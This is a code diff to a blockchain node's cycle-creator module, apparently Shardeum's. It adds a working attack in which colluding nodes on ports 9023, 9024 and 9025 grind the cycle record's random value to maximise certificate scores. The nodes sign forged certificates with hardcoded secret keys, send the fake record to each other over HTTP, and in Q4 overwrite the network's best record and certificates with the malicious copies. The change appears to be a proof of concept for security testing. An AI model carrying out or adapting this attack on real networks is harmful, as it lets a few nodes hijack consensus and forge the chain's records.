@@ -54,6 +54,8 @@ import rfdc from 'rfdc'
 import * as crypto2 from '@shardeum-foundation/lib-crypto-utils'
 import * as Context from '../p2p/Context'
 import * as http from '../http'
+import { CycleCert } from '@shardeum-foundation/lib-types/build/src/p2p/CycleCreatorTypes'
+import { safeStringify } from '@shardeum-foundation/lib-types/build/src/utils/functions/stringify'
 
 const clone = rfdc()
 /** CONSTANTS */
@@ -133,6 +135,13 @@ let bestRecord: P2P.CycleCreatorTypes.CycleRecord
 let bestMarker: P2P.CycleCreatorTypes.CycleMarker
 let bestCycleCert: Map<P2P.CycleCreatorTypes.CycleMarker, P2P.CycleCreatorTypes.CycleCert[]>
 let bestCertScore: Map<P2P.CycleCreatorTypes.CycleMarker, number>
+
+let malRecordCopy
+let malMarkerCopy
+let malCycleCertCopy
+let malCertScoreCopy
+
+let attackNow = false
 
 const timers = {}
 
@@ -360,6 +369,9 @@ async function cycleCreator() {
   // I think setting the current cycle here as well is intuitive, but I don't want to do it right now
   currentQuarter = 0
 
+  //console.log(`[my-log] cycleCreator c${currentCycle}q5`)
+  //console.log(`[my-log] bestRecord:`, bestRecord)
+
   createCycleTag++
   let callTag = `cct${createCycleTag}`
   /* prettier-ignore */ if (logFlags.verbose) info(`cc: start C${currentCycle} Q${currentQuarter} madeCycle: ${madeCycle} bestMarker: ${bestMarker} ${callTag}`)
@@ -393,6 +405,7 @@ async function cycleCreator() {
     let data: P2P.CycleCreatorTypes.CycleData = undefined
     try {
       // Save the previous record to the DB
+      //console.log(`[my-log] prevRecord:`, prevRecord)
       const marker = makeCycleMarker(prevRecord)
       const certificate = makeCycleCert(marker)
       const data: P2P.CycleCreatorTypes.CycleData = { ...prevRecord, marker, certificate }
@@ -577,6 +590,7 @@ async function runQ3() {
   currentQuarter = 3
   Self.emitter.emit('cycle_q3_start')
   if (logFlags.p2pNonFatal) info(`C${currentCycle} Q${currentQuarter}`)
+  console.log(`Q3: start: C${currentCycle} Q${currentQuarter}`)
 
   profilerInstance.profileSectionStart('CycleCreator-runQ3')
   // Get txs and create this cycle's record, marker, and cert
@@ -634,11 +648,19 @@ async function runQ3() {
     Compared cycle cert: ${JSON.stringify(cert)}
   `)
   */
+  
+  // console.log('[my-log] random before gossipMyCycleCert', bestRecord?.random)
+  // console.log('[my-log] bestMarker before gossipMyCycleCert', bestMarker)
 
   madeCycle = true
 
   // Gossip your cert for this cycle with the network
   gossipMyCycleCert()
+
+  // console.log('[my-log] random after gossipMyCycleCert', bestRecord?.random)
+  // console.log('[my-log] bestMarker after gossipMyCycleCert', bestMarker)
+  // console.log('[my-log] bestCycleCert after gossipMyCycleCert', bestCycleCert)
+  // console.log('[my-log] bestCycleScore after gossipMyCycleCert', bestCertScore)
 
   ServiceQueue.processNetworkTransactions(record)
 
@@ -650,7 +672,7 @@ async function runQ3() {
  */
 async function runQ4() {
   currentQuarter = 4
-
+  console.log(`Q4: start: C${currentCycle} Q${currentQuarter}`)
   /* prettier-ignore */ if (logFlags.p2pNonFatal) info(`C${currentCycle} Q${currentQuarter}`)
 
   /* prettier-ignore */ if (logFlags.p2pNonFatal) info(`Q4: start: C${currentCycle} Q${currentQuarter}`)
@@ -661,6 +683,18 @@ async function runQ4() {
     return
   }
   profilerInstance.profileSectionStart('CycleCreator-runQ4')
+
+  if ([9023, 9024, 9025].includes(Self.port) && currentCycle >= 15) {
+    bestRecord = malRecordCopy
+    bestMarker = malMarkerCopy
+    bestCycleCert = malCycleCertCopy
+    bestCertScore = malCertScoreCopy
+  }
+
+  // console.log('[my-log] random before compareCycleCert', bestRecord?.random)
+  // console.log('[my-log] bestMarker before compareCycleCert', bestMarker)
+  // console.log('[my-log] bestCycleCert before compareCycleCert', bestCycleCert)
+  // console.log('[my-log] bestCycleScore before compareCycleCert', bestCertScore)
 
   // Compare your cert for this cycle with the network
   const myC = currentCycle
@@ -688,6 +722,11 @@ async function runQ4() {
       }
     } while (!matched)
 
+    //console.log('[my-log] record after compareCycleCert', bestRecord)
+    console.log('[my-log] bestMarker after compareCycleCert', bestMarker)
+    console.log('[my-log] score for best marker', bestCertScore.get(bestMarker))
+    console.log('[my-log] score for mal marker', bestCertScore.get(malMarkerCopy))
+
     /* prettier-ignore */ if (logFlags.p2pNonFatal)
       info(`
     Certified cycle record: ${Utils.safeStringify(record)}
@@ -695,6 +734,7 @@ async function runQ4() {
     Certified cycle cert: ${Utils.safeStringify(cert)}
   `)
   } finally {
+    console.log()
     /* prettier-ignore */ if (logFlags.p2pNonFatal) info(`Q4: END: myC:${myC}  C${currentCycle} Q${currentQuarter} Certified cycle record: ${Utils.safeStringify(record.counter)}`)
     // Dont need this any more since we are not doing anything after this
     // if (cycleQuarterChanged(myC, myQ)) return
@@ -741,7 +781,7 @@ function makeCycleRecord(
 
   currentStart = baseRecord.start
 
-  const cycleRecord = Object.assign(baseRecord, {
+  let cycleRecord = Object.assign(baseRecord, {
     joined: [],
     returned: [],
     lost: [],
@@ -757,49 +797,93 @@ function makeCycleRecord(
     txlisthash: '',
   }) as P2P.CycleCreatorTypes.CycleRecord
 
+  submodules.map((submodule) => submodule.updateRecord(cycleTxs, cycleRecord, prevRecord))
+  //Updating Cycle Record if network has entered 'Shutdown' Mode
+  if (config.p2p.initShutdown || cycleRecord.mode === 'shutdown') {
+    console.log('Updating Shutdown Mode Cycle Record...')
+    cycleRecord.removed = ['all']
+    cycleRecord.archiversAtShutdown = Array.from(Archivers.archivers.values())
+  }
+
   //get node ip
   const nodeIp = Context?.network?.ipInfo?.externalIp
   const nodePort = Context?.network?.ipInfo?.externalPort
 
   // Only do this for node 9023 (malicious node)
-  if (nodeIp && nodePort === 9023) {
+  if (nodeIp && nodePort === 9023 && currentCycle >= 15 && currentQuarter === 3) {
+    console.log('current cycle:', currentCycle)
+
     let highestScore = 0
     let bestRand = 0
 
-    for (let i = 0; i < 100; i++) {
-      const rand = Math.floor(Math.random() * 100000) + 100
+    for (let i = 0; i < 10; i++) {
+      const rand = Math.floor(Math.random() * 100000)
       cycleRecord.random = rand
-      console.log('[my-log] generated rand value: ', rand)
       const malMarker = makeCycleMarker(cycleRecord)
+      console.log('[my-log] iteration: ', i)
+      console.log('[my-log] generated rand value: ', rand)
+      console.log('[my-log] cycle record: ', Utils.safeStringify(cycleRecord))
+      console.log('[my-log] cycle marker: ', malMarker)
       // Use the secret and public keys of the malicious nodes here. 
       // These keys are hardcoded for reuse since I'm using same instances in every restart, 
       // and can be sourced directly from secrets.json.
-      const cert1 = makeMaliciousCycleCert({ malMarker }, "b66b9d3e441e758ca8d590a4c9fd841ccd7c3f3040fe0bd98895a07318e83c2be9f10a9b4912202391ecb0f41096f071685fea9a0a27dadad61437915e9dd42c", "e9f10a9b4912202391ecb0f41096f071685fea9a0a27dadad61437915e9dd42c")
-      const cert2 = makeMaliciousCycleCert({ malMarker }, "7dcb007fd354256afe8dabe853dbe3e771911eb04c9f65d5b6f139fd897c364a0acfb8580bed9853cba1d10080cce5a1625382cb4112fac35c7cf3ebd555ac26", "0acfb8580bed9853cba1d10080cce5a1625382cb4112fac35c7cf3ebd555ac26")
-      const cert3 = makeMaliciousCycleCert({ malMarker }, "d126caad52a41698c337d5deb115641a77cb3629e2b4db819e3e256574cc5708af1feec9bdcddae22dcca6efabbb0b0ddf2eb4c7d31fe28ab1d9b6136f65fec3", "af1feec9bdcddae22dcca6efabbb0b0ddf2eb4c7d31fe28ab1d9b6136f65fec3")
-      console.log('[my-log] cert1: ', cert1)
-      console.log('[my-log] cert2: ', cert2)
-      console.log('[my-log] cert3: ', cert3)
+      const cert1 = makeMaliciousCycleCert(malMarker , "b66b9d3e441e758ca8d590a4c9fd841ccd7c3f3040fe0bd98895a07318e83c2be9f10a9b4912202391ecb0f41096f071685fea9a0a27dadad61437915e9dd42c", "e9f10a9b4912202391ecb0f41096f071685fea9a0a27dadad61437915e9dd42c")
+      const cert2 = makeMaliciousCycleCert(malMarker , "7dcb007fd354256afe8dabe853dbe3e771911eb04c9f65d5b6f139fd897c364a0acfb8580bed9853cba1d10080cce5a1625382cb4112fac35c7cf3ebd555ac26", "0acfb8580bed9853cba1d10080cce5a1625382cb4112fac35c7cf3ebd555ac26")
+      const cert3 = makeMaliciousCycleCert(malMarker , "d126caad52a41698c337d5deb115641a77cb3629e2b4db819e3e256574cc5708af1feec9bdcddae22dcca6efabbb0b0ddf2eb4c7d31fe28ab1d9b6136f65fec3", "af1feec9bdcddae22dcca6efabbb0b0ddf2eb4c7d31fe28ab1d9b6136f65fec3")
       const score1 = scoreCert(cert1)
+      cert1.score = score1
       const score2 = scoreCert(cert2)
+      cert2.score = score2
       const score3 = scoreCert(cert3)
+      cert3.score = score3
       const sum = score1 + score2 + score3
+      //console.log(`iteration:${i}, rand:${rand}, highestScore:${highestScore}, sum: ${sum}, score1: ${score1}, score2: ${score2}, score3: ${score3}, malMarker: ${malMarker}`)
+      //console.log('[my-log] cert1: ', cert1, ' cert2:', cert2, ' cert3:', cert3)
+
       if (sum > highestScore) {
+        console.log(`[my-log] improved record; rand was ${rand}. cycleRecord.random is ${cycleRecord.random}`)
+        bestCycleCert.delete(bestMarker)
+        bestCertScore.delete(bestMarker)
         highestScore = sum
         bestRand = rand
-        bestRecord = cycleRecord
+        bestRecord = Utils.safeJsonParse(Utils.safeStringify(cycleRecord))
         bestMarker = malMarker
         bestCycleCert.set(malMarker, [cert1, cert2, cert3])
         bestCertScore.set(malMarker, sum)
       }
     }
-    console.log('[my-log] Sending fake cycle record to node 9024')
+
+    for (const [marker, certs] of bestCycleCert) {
+      for (const cert of certs) {
+        NodeList.byJoinOrder.find(node => node.publicKey === cert.sign.owner).externalPort
+      }
+    }
+    const id1 = NodeList.byJoinOrder.find(node => node.externalPort === 9023).id
+    const obj1 = { id1 }
+    const id2 = NodeList.byJoinOrder.find(node => node.externalPort === 9024).id
+    const obj2 = { id2 }
+    const id3 = NodeList.byJoinOrder.find(node => node.externalPort === 9025).id
+    const obj3 = { id3 }
+    
+    console.log('[my-log] bestMarker.substring', parseInt(bestMarker.substring(0, 8), 16))
+
+    console.log('[my-log] hid9023.substring', parseInt(crypto.hash(obj1).substring(0, 8), 16))
+    console.log('[my-log] hid9024.substring', parseInt(crypto.hash(obj2).substring(0, 8), 16))
+    console.log('[my-log] hid9025.substring', parseInt(crypto.hash(obj3).substring(0, 8), 16))
+
+    cycleRecord = bestRecord
+
+    // console.log('[my-log] bestRecord', bestRecord)
+    // console.log('[my-log] bestMarker', bestMarker)
+    // console.log('[my-log] Sending fake cycle record to node 9024')
 
     const serializedBestCycleCert = bestCycleCert ? Array.from(bestCycleCert.entries()) : [];
     const serializedBestCertScore = bestCertScore ? Array.from(bestCertScore.entries()) : [];
 
-    console.log('[my-log] serializedBestCycleCert: ', Utils.safeStringify(serializedBestCycleCert))
-    console.log('[my-log] serializedBestCertScore: ', Utils.safeStringify(serializedBestCertScore))
+    malRecordCopy = Utils.safeJsonParse(Utils.safeStringify(bestRecord))
+    malMarkerCopy = Utils.safeJsonParse(Utils.safeStringify(bestMarker))
+    malCycleCertCopy = new Map(JSON.parse(JSON.stringify(Array.from(bestCycleCert))));
+    malCertScoreCopy = new Map(JSON.parse(JSON.stringify(Array.from(bestCertScore))));
 
     http.post(`http://${nodeIp}:9024/makeFakeCycleRecord`, {
       record: bestRecord,
@@ -807,9 +891,9 @@ function makeCycleRecord(
       cert: serializedBestCycleCert,
       score: serializedBestCertScore,
     }).then((res) => {
-      console.log('[my-log] makeFakeCycleRecord sent');
+      //console.log('[my-log] makeFakeCycleRecord sent to 9024');
     }).catch((err) => {
-      console.log('[my-log] makeFakeCycleRecord error: ', err);
+      //console.log('[my-log] makeFakeCycleRecord error: ', err);
     })
 
     console.log('[my-log] Sending fake cycle record to node 9025')
@@ -819,19 +903,12 @@ function makeCycleRecord(
       cert: serializedBestCycleCert,
       score: serializedBestCertScore,
     }).then((res) => {
-      console.log('[my-log] makeFakeCycleRecord sent');
+      //console.log('[my-log] makeFakeCycleRecord sent to 9025');
     }).catch((err) => {
-      console.log('[my-log] makeFakeCycleRecord error: ', err);
+      //console.log('[my-log] makeFakeCycleRecord error: ', err);
     })
   }
 
-  submodules.map((submodule) => submodule.updateRecord(cycleTxs, cycleRecord, prevRecord))
-  //Updating Cycle Record if network has entered 'Shutdown' Mode
-  if (config.p2p.initShutdown || cycleRecord.mode === 'shutdown') {
-    console.log('Updating Shutdown Mode Cycle Record...')
-    cycleRecord.removed = ['all']
-    cycleRecord.archiversAtShutdown = Array.from(Archivers.archivers.values())
-  }
   return cycleRecord
 }
 
@@ -841,6 +918,20 @@ export function registerFakeCycleRecordHandlers(bestRecord_, bestMarker_, bestCy
   bestMarker = bestMarker_
   bestCycleCert = bestCycleCert_
   bestCertScore = bestCertScore_
+  record = bestRecord
+  marker = bestMarker
+  const certs = bestCycleCert.get(bestMarker)
+  cert = certs.find((cert) => cert.sign.owner === crypto.keypair.publicKey)
+  if (!cert) {
+    console.log('dont have a cert')
+  } else if (cert.sign.owner !== crypto.keypair.publicKey) {
+    console.log('dont have the right cert')
+  }
+  malRecordCopy = Utils.safeJsonParse(Utils.safeStringify(bestRecord))
+  malMarkerCopy = Utils.safeJsonParse(Utils.safeStringify(bestMarker))
+  malCycleCertCopy = new Map(JSON.parse(JSON.stringify(Array.from(bestCycleCert))));
+  malCertScoreCopy = new Map(JSON.parse(JSON.stringify(Array.from(bestCertScore))));
+  gossipMyCycleCert()
   return 1
 }
 
@@ -857,9 +948,7 @@ function makeCycleCert(marker: P2P.CycleCreatorTypes.CycleMarker): P2P.CycleCrea
 }
 
 function makeMaliciousCycleCert(marker: any, secretKey: any, publicKey: any): P2P.CycleCreatorTypes.CycleCert {
-  const objCopy = Utils.safeJsonParse(Utils.safeStringify(marker))
-  crypto2.signObj(objCopy, secretKey, publicKey)
-  return objCopy
+  return crypto2.signObj({ marker}, secretKey, publicKey) as CycleCert
 }
 
 function makeNetworkConfigHash() {
@@ -1047,6 +1136,8 @@ function scoreCert(cert: P2P.CycleCreatorTypes.CycleCert): number {
     const id = NodeList.byPubKey.get(cert.sign.owner).id // get node id from cert pub key
     const obj = { id }
     const hid = crypto.hash(obj) // Omar - use hash of id so the cert is not made by nodes that are near based on node id
+    !cert.marker ? console.log('scoreCert: marker is null') : 0
+    !hid ? console.log('scoreCert: hid is null') : 0
     const out = utils.XOR(cert.marker, hid)
     return out
   } catch (err) {
@@ -1374,6 +1465,7 @@ function gossipHandlerCycleCert(inp: CompareCertReq, sender: P2P.NodeListTypes.N
   if (!validateCerts(inpCerts, inpRecord, sender, 'gossipHandlerCycleCert')) {
     return
   }
+  if (inpRecord.random !== 0) console.log('gossipHandlerCycleCert: got record with random', inpRecord.random)
   if (improveBestCert(inpCerts, inpRecord)) {
     // don't need the following line anymore since improveBestCert sets bestRecord if it improved
     // bestRecord = inpRecord
